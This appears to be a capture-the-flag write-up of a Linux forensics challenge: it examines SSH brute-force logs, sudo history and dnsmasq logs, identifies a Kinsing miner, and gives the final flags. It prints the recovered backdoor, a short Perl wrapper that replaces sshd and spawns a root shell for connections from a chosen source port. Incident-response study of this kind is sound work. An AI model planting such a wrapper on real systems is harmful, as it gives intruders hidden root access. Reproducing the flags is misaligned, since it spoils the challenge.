# silentminer

Co-authors: @eki

```
铛，铛，铛，洞穴里传来铁镐敲击石头的声音。
回答以下问题，每个问题都是一个单独的flag：

    攻击者的ip地址
    攻击者共进行多少次ssh口令爆破失败？
    后门文件路径的绝对路径
    攻击者用户分发恶意文件的域名（注意系统时区）
    挖矿病毒所属的家族（全小写）

注意:每一小问的答案提交的时候需要带上flag{*} 比如答案whoami 需要提交flag{whoami}。答对所有小问后，才会得到该题的 flag。
题目附件链接1：https://pan.baidu.com/s/1HLkthjGvjnRT34hm_Ifkew?pwd=6b9b
题目附件链接2（SilentMiner.7z+BadEmail.zip）：https://adnav-data.obs.myhuaweicloud.com:443/wq/%E9%99%84%E4%BB%B6.zip?AccessKeyId=HPUALOBCQTBFQ07YYZGK&Expires=1757481203&Signature=jcX94Vns/CoyOkAAtA6kVN8SS5U%3D
```

A disk image is provided, we mount the ext partition of it:

```shell
$ sudo losetup -P -f disk.dd
$ sudo mount /dev/loop0p5 mnt
```

To solve the first question `攻击者的ip地址`, we look for ssh authentication log:

```shell
$ cat var/log/auth.log | grep "Failed password" | head
Aug 10 09:57:10 lee-virtual-machine sshd[83179]: Failed password for lee from 192.168.145.131 port 36554 ssh2
Aug 10 09:57:10 lee-virtual-machine sshd[83180]: Failed password for lee from 192.168.145.131 port 36558 ssh2
Aug 10 09:57:10 lee-virtual-machine sshd[83177]: Failed password for lee from 192.168.145.131 port 36548 ssh2
Aug 10 09:57:10 lee-virtual-machine sshd[83178]: Failed password for lee from 192.168.145.131 port 36546 ssh2
Aug 10 09:57:13 lee-virtual-machine sshd[83178]: Failed password for lee from 192.168.145.131 port 36546 ssh2
Aug 10 09:57:13 lee-virtual-machine sshd[83179]: Failed password for lee from 192.168.145.131 port 36554 ssh2
Aug 10 09:57:13 lee-virtual-machine sshd[83177]: Failed password for lee from 192.168.145.131 port 36548 ssh2
Aug 10 09:57:13 lee-virtual-machine sshd[83180]: Failed password for lee from 192.168.145.131 port 36558 ssh2
Aug 10 09:57:16 lee-virtual-machine sshd[83178]: Failed password for lee from 192.168.145.131 port 36546 ssh2
Aug 10 09:57:16 lee-virtual-machine sshd[83179]: Failed password for lee from 192.168.145.131 port 36554 ssh2
```

So it is `192.168.145.131`. To count the number of failed attempts:

```shell
$ cat var/log/auth.log | grep "Failed password" | wc -l
257
```

However, it is incorrect, 258 is the answer after some trial and error. Maybe some of these are considered as well:

```
Aug 10 09:57:08 lee-virtual-machine sshd[83175]: Received disconnect from 192.168.145.131 port 36542:11: Bye Bye [preauth]
Aug 10 09:57:08 lee-virtual-machine sshd[83175]: Disconnected from authenticating user lee 192.168.145.131 port 36542 [preauth] 

Aug 10 10:00:44 lee-virtual-machine sshd[83929]: Invalid user kali from 192.168.145.131 port 47584
```

The third part is to find the backdoor. The user used sudo:

```
Aug 10 10:01:53 lee-virtual-machine sudo:      lee : TTY=pts/0 ; PWD=/home/lee ; USER=root ; COMMAND=/usr/bin/tee -a sshd
Aug 10 10:01:53 lee-virtual-machine sudo: pam_unix(sudo:session): session opened for user root by lee(uid=0)
Aug 10 10:01:53 lee-virtual-machine sudo: pam_unix(sudo:session): session closed for user root
Aug 10 10:03:26 lee-virtual-machine sudo:      lee : TTY=pts/0 ; PWD=/home/lee ; USER=root ; COMMAND=/usr/bin/rm sshd
Aug 10 10:03:26 lee-virtual-machine sudo: pam_unix(sudo:session): session opened for user root by lee(uid=0)
Aug 10 10:03:26 lee-virtual-machine sudo: pam_unix(sudo:session): session closed for user root
Aug 10 10:04:00 lee-virtual-machine sudo:      lee : TTY=pts/0 ; PWD=/usr/sbin ; USER=root ; COMMAND=/usr/bin/mv sshd ../bin
Aug 10 10:04:00 lee-virtual-machine sudo: pam_unix(sudo:session): session opened for user root by lee(uid=0)
Aug 10 10:04:00 lee-virtual-machine sudo: pam_unix(sudo:session): session closed for user root
Aug 10 10:04:07 lee-virtual-machine sudo:      lee : TTY=pts/0 ; PWD=/usr/sbin ; USER=root ; COMMAND=/usr/bin/tee sshd
Aug 10 10:04:07 lee-virtual-machine sudo: pam_unix(sudo:session): session opened for user root by lee(uid=0)
Aug 10 10:04:07 lee-virtual-machine sudo: pam_unix(sudo:session): session closed for user root
Aug 10 10:04:12 lee-virtual-machine sudo:      lee : TTY=pts/0 ; PWD=/usr/sbin ; USER=root ; COMMAND=/usr/bin/tee -a sshd
Aug 10 10:04:12 lee-virtual-machine sudo: pam_unix(sudo:session): session opened for user root by lee(uid=0)
Aug 10 10:04:12 lee-virtual-machine sudo: pam_unix(sudo:session): session closed for user root
Aug 10 10:04:18 lee-virtual-machine sudo:      lee : TTY=pts/0 ; PWD=/usr/sbin ; USER=root ; COMMAND=/usr/bin/tee -a sshd
Aug 10 10:04:18 lee-virtual-machine sudo: pam_unix(sudo:session): session opened for user root by lee(uid=0)
Aug 10 10:04:18 lee-virtual-machine sudo: pam_unix(sudo:session): session closed for user root
Aug 10 10:04:23 lee-virtual-machine sudo:      lee : TTY=pts/0 ; PWD=/usr/sbin ; USER=root ; COMMAND=/usr/bin/chmod u+x sshd
Aug 10 10:04:23 lee-virtual-machine sudo: pam_unix(sudo:session): session opened for user root by lee(uid=0)
Aug 10 10:04:23 lee-virtual-machine sudo: pam_unix(sudo:session): session closed for user root
Aug 10 10:04:28 lee-virtual-machine sudo:      lee : TTY=pts/0 ; PWD=/usr/sbin ; USER=root ; COMMAND=/usr/sbin/service sshd restart
Aug 10 10:04:28 lee-virtual-machine sudo: pam_unix(sudo:session): session opened for user root by lee(uid=0)
```

So we reach for `/usr/sbin/sshd`, it is indeed a backdoor:

```perl
#!/usr/bin/perl
exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);
exec{"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,
```

To find the domain used in attack, @eki suggests to look for dnsmasq logs:

```shell
$ cat var/log/dnsmasq.log | grep reply | awk "{ print \$6;}" | sort | uniq > ../hostnames
```

Skimming through the hostnames, we find something uncommon: `tombaky.com`. It is the attacker's domain.

So the last thing is to find the name of the miner. @eki asked for AI:

```
通过 SSH 传播的挖矿家族
常见的挖矿木马会利用 SSH 弱口令/暴力破解 或 密钥窃取 在内网横向传播。比较典型的家族有：

Kinsing
利用 SSH 弱口令传播，挖矿 + 持久化 + 云环境逃逸。

Plebminer / MinerD
通过 SSH 暴力破解横向移动，部署 XMRig 挖门罗。

Kaiji
针对 IoT/Linux 设备，使用 Go 编写，通过 SSH 暴力破解入侵，执行 DDoS + 挖矿。

WatchDog
通过已知漏洞和弱口令传播，主要部署门罗币挖矿程序。

Hakai / Tsunami 变种
具备蠕虫特性，通过 SSH 横向传播，部分变种也会植入挖矿程序。

XorDDoS / BillGates 木马
原本是 DDoS 木马，有些样本也集成了挖矿。

这些家族的共同点：一旦攻陷，会替换系统文件（包括 sshd）、关闭竞争对手挖矿进程、下载并运行 XMRig 或改造版矿工。
```

After some attempts, the correct one is `kinsing`. Therefore, the whole flag is:

```
flag{192.168.145.131}flag{258}flag{/usr/sbin/sshd}flag{tombaky.com}flag{kinsing}
```
